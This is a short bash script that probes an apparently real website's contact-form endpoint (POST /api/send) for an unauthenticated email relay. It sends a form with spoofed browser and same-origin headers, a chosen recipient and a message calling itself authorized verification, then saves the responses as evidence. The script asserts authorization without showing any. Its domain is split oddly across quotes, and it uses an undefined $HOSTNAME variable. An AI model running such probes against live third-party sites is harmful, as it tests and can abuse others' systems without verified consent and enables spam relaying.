#!/bin/bash
# Independent verification: unauthenticated email relay via POST /api/send
# Probe 1: baseline, legitimate site target, browser-like headers, NO auth/CSRF/CAPTCHA.
HOST="https://www."infinity"capital.bh"
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6111.65 Safari/537.36"
LEGIT="info@""infinitycapital.bh"

echo "### STEP 1 baseline: POST /api/send, legit recipient, no auth"
curl -sk -D /work/evidence/step1.hdr -o /work/evidence/step1.body \
  -w "HTTP_CODE=%{http_code} TIME=%{time_total} SIZE=%{size_download}\n" \
  -A "$UA" \
  -H "Accept: */*" \
  -H "Accept-Language: en-US,en;q=0.9" \
  -H "Origin: https://www.$HOSTNAME" \
  -H "Sec-Fetch-Site: same-origin" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
  -F "fname=Verifier" -F "lname=Probe" -F "areacode=973" -F "tel=5550001234" \
  -F "cname=Acme Capital" -F "subject=Security Verification" \
  -F "msg=Authorized security verification. Please ignore." \
  -F "check=1" -F "targets=$LEGIT" \
  "https://www.infinity"capital.bh/api/send
echo "--- response headers ---"
cat /work/evidence/step1.hdr
echo "--- response body ---"
cat /work/evidence/step1.body
echo
